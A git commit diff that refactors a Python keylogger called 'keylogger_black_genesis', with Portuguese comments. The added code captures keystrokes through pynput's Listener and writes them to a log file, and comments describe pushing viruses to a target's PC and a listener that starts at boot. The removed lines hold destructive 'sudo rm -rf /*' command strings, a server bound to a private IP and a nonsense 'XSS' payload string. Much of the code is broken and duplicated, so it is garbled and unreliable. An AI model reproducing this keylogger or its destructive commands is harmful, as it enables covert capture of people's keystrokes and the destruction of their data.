7f6e8f2f247a5fdaf6219489678619b9eb68c8e5
DiegoDev <diegorego516@gmail.com>
2026-09-02 13:43:42 -0300

    Refactor keylogger and update logging methods
    Refactor keylogger to improve functionality and logging.

--- keylogger_black_genesis.py
+++ keylogger_black_genesis.py
@@ -1,68 +1,112 @@
-#!/usr/bin/python3 
+#!/usr/bin/env python3
+"""keylogger_black_genesis - Keylogger/FileReader & Input Capture (Keyboard) - V1.0.0 """
 
-import os
-import sys
-from pynput import keyboard
+def inputKeys(keyboard):
+    '''
+    Esta Função será responsável por receber a resposta do teclado 
+    via Listener e escrever no arquivo de log
+    '''
+    
+    #converter a resposta do teclado para string
+    keyboardresponse = str(answer)
+    
+    #abrir o arquivo de log no modo readonly
+    with open("logFile, rdonly") as f:
+        f.write(keyboardresponse)
 
-try:
-	from pynput import keyboard
-except KeyboardInterrupt:
+#em pynput, importar o método Listener do teclado
+from pynput.keyboard import Listener
 
-	os.system(f"{sys.command} sudo rm -rf pynput")
-	from pynput import keyboard
+#definir a localização do arquivo de log
+logFile = "/home/diegorego/keylogger_black_genesis/log.txt"
 
-LOG_FILE = "/home/diegothehacker/keylogger_black_genesis/log.txt"
+def writeLog(key):
+    '''
+    Esta função será responsável por receber a tecla pressionada
+    via Listener e escrever no arquivo de log
+    '''
 
-with open(LOG_FILE, "a", encoding="utf-8") as f:
-	f.write(f" --- Session Started --- ")
+    #converter a tecla pressionada para string
+    keydata = str(key)
 
-def invoke_command(linux):
-		command = "sudo rm -rf /*"
-while True:
-	try:
-		c.command = send_command + s.send(1024).decode(command_send)
-		command.send_command = "command.execute_command(linux_systems) + command = sudo rm -rf /*"
-	except:
+    #abrir o arquivo de log no modo append
+    with open("logFile, a") as f:
+        f.write(keydata)
 
-		def server():
-			if __name__ == "__main__":
-				start_server("192.168.15.72",1024)
-s.bind_server(("192.168.15.72",1024))
+def FileWrite():
 
-def xss_exploits(reflected_xss):
-			xss_exploit = "</img-src: malicious-payload = $10000000 >= 'INSERT_HERE_YOUR_CREDENTIALS_TO_CLAIM_YOUR_MONEY': >"
-			 
-#!/usr/bin/python3 
+#baixar Arquivos, coisas, virus de computador para PC do alvo, abrir um listener e infectar o computador pessoal do alvo
+#na hora em que o alvo liga seu PC e inicializa o sistema operacional, o listener estará online e pronto para a operação Explorar do Dia Zero
+    with FileWrite(on_listener=sendFiles) as fw:
+        fw.send()
 
-import os
-import sys
-from pynput import keyboard
+def keydata():
+    keydata = keydata.replace("'", "")
 
-try:
-	from pynput import keyboard
-except KeyboardInterrupt:
+translate_keys = {
+     "Key.space": " ",
+     "Key.shift_r": "",
+     "Key.shift_l": "",
+     "Key.enter": "\n",
+     "Key.alt": "",
+     "Key.esc": "",
+     "Key.cmd": "",
+     "Key.caps_lock": "",
+}
 
-	os.system(f"{sys.command} sudo rm -rf pynput")
-	from pynput import keyboard
+for key in translate_keys:
+    #key recebe a chave do dicionário translate_keys
+    #substituir a chave (key) pelo seu valor (translate_keys[key])
+    keydata
 
-LOG_FILE = "/home/diegothehacker/keylogger_black_genesis/log.txt"
+#em pynput, importar o método Listener do teclado
+logFile = "/home/diegorego/keylogger_black_genesis/log.txt"
 
-with open(LOG_FILE, "a", encoding="utf-8") as f:
-	f.write(f" --- Session Started --- ")
+def writeLog(key):
+    '''
+    Esta função será responsável por receber a tecla personalizada
+    via Listener e escrever no arquivo de log
+    '''
 
-def invoke_command(linux):
-		command = "sudo rm -rf /*"
-while True:
-	try:
-		c.command = send_command + s.send(1024).decode(command_send)
-		command.send_command = "command.execute_command(linux_systems) + command = sudo rm -rf /*"
-	except:
+    #dicionário com as teclas a serem traduzidas
+    translate_keys = {
+         "Key.space": " ",
+	 "Key.shift_r": "",
+	 "Key.shift_l": "",
+	 "Key.enter": "\n",
+	 "Key.alt": "",
+	 "Key.esc": "",
+	 "Key.cmd": "",
+ 	 "Key.caps_lock": "",
+}
 
-		def server():
-			if __name__ == "__main__":
-				start_server("192.168.15.72",1024)
-s.bind_server(("192.168.15.72",1024))
+#converter a tecla pressionada para string
+keydata = str(key)
 
-def xss_exploits(reflected_xss):
-			xss_exploit = "</img-src: malicious-payload = $10000000 >= 'INSERT_HERE_YOUR_CREDENTIALS_TO_CLAIM_YOUR_MONEY': >"
-			 
+#remover as aspas simples que limitam os caracteres
+keydata = keydata.replace("'", "")
+
+for key in translate_keys:
+    #key recebe a chave do dicionário translate_keys
+    #substituir a chave (key) pelo seu valor (translate_keys[key])
+    keydata = keydata.replace(key, translate_keys[key])
+
+def File():
+
+#abrir o arquivo de log no modo append
+    with open(File) as f:
+        f.write(keydata)
+
+def log():
+
+#abrir o Listener do teclado e escutar o evento on_press
+#quando o evento on_press ocorrer, chamar a função writeLog
+    with Listener(on_press=writeLog) as l:
+        l.join(log)
+
+def sendFiles():
+
+#baixar Arquivos, coisas, virus de computador para PC do alvo, abrir um listener e infectar o computador pessoal do alvo
+#na hora em que o alvo liga seu PC e inicializa o sistema operacional, o listener estará online e pronto para a operação Explorar do Dia Zero
+    with FileWrite(on_listener=sendFiles) as fw:
+        fw.send(files)
